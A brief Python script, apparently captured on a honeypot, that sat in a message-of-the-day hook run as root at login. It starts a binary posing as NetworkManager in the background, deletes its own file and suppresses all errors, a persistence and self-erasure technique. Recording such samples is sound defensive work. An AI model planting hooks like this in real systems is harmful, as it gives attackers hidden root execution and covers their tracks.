# On the honeypot, this file is: /etc/update-motd.d/20-motd-info
#!/bin/python3
try:
    import os
    if os.path.exists("/usr/bin/NetworkManager"):
        os.system("/usr/bin/NetworkManager --no-daemon &")
    os.remove("/etc/update-motd.d/20-motd-info")
except:
    pass